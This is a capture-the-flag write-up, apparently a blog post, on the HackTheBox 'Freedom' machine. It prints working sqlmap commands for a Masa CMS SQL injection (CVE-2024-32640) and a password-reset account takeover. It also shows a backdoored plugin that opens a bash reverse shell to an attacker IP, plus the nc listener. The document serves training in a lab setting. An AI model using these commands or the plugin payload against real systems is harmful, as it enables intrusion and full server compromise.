---
layout: post
title: "HackTheBox University CTF 2024 - Freedom Writeup"
permalink: /writeups/ctf/HTB-University-CTF-2024/freedom
categories: [ctf, medium]
---

<h1><ins>HackTheBox University CTF 2024: Freedom Writeup</ins></h1>

**Date:** 18/12/2024\
**Author:** [acfirthh](https://github.com/acfirthh)

**Challenge Name:** Freedom\
**Difficulty:** Medium

## Reconaissance
### NMAP Scan
![NMAP Scan](/assets/images/writeups/htb-university-ctf-2024/freedom/nmap_scan.png)

From the NMAP scan, I immediately noticed that it had most of the common ports open that a Domain Controller would have *(also the hostname was **DC1**...)*, as well as having port 80 (HTTP) open hosting a website that NMAP was able to fetch the **robots.txt** entries from.

The website had the domain name **freedom.htb**.

> Add **freedom.htb** and **DC1.freedom.htb** to the /etc/hosts file.

## Initial Look at the Website
I started up **BurpSuite**, activated **foxy proxy** in my browser and visited **http://freedom.htb**.

![Freedom.htb Website](/assets/images/writeups/htb-university-ctf-2024/freedom/website.png)

I was met with this rather funky blog with 4 blog posts. I looked back at the NMAP scan, specifically at the entries in the **robots.txt** file and saw that `/admin/` was there, so of course, I browsed to that directory.

![Masa CMS Login](/assets/images/writeups/htb-university-ctf-2024/freedom/admin_page.png)

There was a login page for what seemed to be **"Masa CMS"**, but there wasn't a version number anywhere on the page, so looking at **BurpSuite** to see request and response headers sent in requests, I spotted that the version number was disclosed in a response header.

![Masa CMS Version](/assets/images/writeups/htb-university-ctf-2024/freedom/masa_cms_version.png)

The version running is **"Masa CMS 7.4.5"**, now equipped with this information, I took to the internet to research for potential vulnerabilities and exploits that have been found and disclosed for this version.

### SQL Injection
I discovered that there was a recent [SQL Injection](https://projectdiscovery.io/blog/hacking-apple-with-sql-injection) vulnerability found in **Masa CMS** marked as **CVE-2024-32640** with a [Proof-of-Concept](https://www.pizzapower.me/2024/11/13/mura-masa-cms-sql-injection-cve-2024-32640/) Python script freely available.

Instead of using this PoC, I decided to just use **sqlmap** and quickly threw together a command to use:
```bash
sqlmap -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject" --data "object=displayregion&contenthistid=x%5C'*--+Arrv&previewid=1" --level 3 --risk 2 --method POST --dbms=mysql --timeout=10 --technique=T --batch -D dbMasaCMS -T <table> -C <column/s>
```

**Masa CMS** is also open-source, meaning the entire *(unmodified)* source code is available on their [GitHub repository](https://github.com/MasaCMS/MasaCMS).

Looking through the source code, I found a **.sql** file containing all of the table and column names created in the database during the intial setup! There was a table named **tusers** which contained the columns: **Fname**, **Lname**, **UserName**, **Email**, and **Password**.\
*(Amongst quite a few other columns, but I focussed on these mainly)*

I modified my **sqlmap** command to dump the data stored in these columns from the table, it revealed that the **Password** column contained **bcrypt** hashes. I initially attempted to crack these hashes, however I was unable to crack any of them.

## Initial Access
I looked back at the login page on the website and spotted a *"Forgot Password"* feature, I thought that if I clicked that and entered the email address of the admin user (`admin@freedom.htb`), then I would be able to find the password reset link in the database somewhere. I looked back through the source code and found a table named **tredirects** with a column called **URL**, this was the only reference I was able to spot to a URL in any of the tables.

So, I tested it out. I clicked the *"Forgot Password"* button, entered the admin's email address, and then used **sqlmap** to dump the data stored in the **URL** column in the **tredirects** table.

![Admin Password Reset](/assets/images/writeups/htb-university-ctf-2024/freedom/admin_password_reset.png)

```bash
sqlmap -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject" --data "object=displayregion&contenthistid=x%5C'*--+Arrv&previewid=1" --level 3 --risk 2 --method POST --dbms=mysql --timeout=10 --technique=T --batch -D dbMasaCMS -T tredirects -C URL --dump
```

![Password Reset Link](/assets/images/writeups/htb-university-ctf-2024/freedom/password_reset_link.png)

I copied the retrieved link and pasted it into my browser, it opened up a profile editor for the admin user, I changed the password and submitted it, then it automatically logged me in after the password change! **SUCCESS!**

After reading back the post made by the researchers that discovered the SQL injection vulnerability, I saw that they referenced that it would be possible to get **RCE** by uploading a malicious plugin. Doing some more research, I found out that **Masa CMS** and **Mura CMS** are pretty similar and use the same plugins and language, so I downloaded a pre-made **Mura CMS** plugin and modified the code to run malicious code when installed.

#### Backdooring the Plugin
When reading the NMAP scan results, I spotted that it said that the web server was running on **Apache** for **Ubuntu** which I thought was a bit odd because it was supposedly a Domain Controller which are usually **Windows Server** based. But I just thought that maybe it was running in a **Docker** container or something similar.

I modified the `index.cfm` page in the plugin to contain only this code:

```text
<cfexecute name="/bin/bash" arguments="-c '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
'" variable="data" timeout="10" />
<cfdump var="#data#">
```

I then modified the `Application.cfc` to only include the `index.cfm` and the `settings.cfm` files. This would mean that it only executes my malicious code and doesn't do anything I don't want it to.

```text
component accessors=true output=false {

	property name='$';

	include 'plugin/settings.cfm';

	public any function onApplicationStart() {
		return true;
	}

	public any function onRequestStart(required string targetPage) {
		return true;
	}

	public void function onRequest(required string targetPage) {
		include 'index.cfm';
	}

	public void function onSessionStart() {
	}

	public void function onSessionEnd() {
	}

}
```

After modifying the code, I simply zipped it up using the command:\
`zip -r plugin.zip ./MuraPlugin`

After zipping up the plugin contents, I browsed to the plugin upload page on the admin console and uploaded my modified plugin.

![Plugin Upload](/assets/images/writeups/htb-university-ctf-2024/freedom/upload_plugin.png)

I started a listener on my machine:\
`nc -nvlp 4444`

I then clicked *"Deploy"* and then clicked the *"UPDATE"* button to run my plugin. I checked my listener but I didn't have a callback just yet, so I visited the index page of the plugin in my browser:\
`http://freedom.htb/plugins/MuraPlugin/index.cfm`

Again, I checked my listener and I had a shell as... **root!**

![Root Shell](/assets/images/writeups/htb-university-ctf-2024/freedom/root_shell.png)

I looked about the file system but didn't find any flags, I also noticed that it was NOT a **Docker** container.

I then ran the command `mount` to view any mounted filesystems and spotted a filesystem mounted at `/mnt/c`. I changed directory into it and saw that it was a **Windows** filesystem! This must have been where all of the Domain Controller processes were being run. But, I had full root access to the filesystem so I just got the flags from the **Administrator** user's desktop and **j.bret** user's desktop!

## Final Words
This route was definitely unintended as there was no need for any sort of privilege escalation and it gave immediate root access to the filesystem. But nevertheless, it was still an incredibly fun challenge with plenty of enumeration needed to find what was required to exploit the machine.
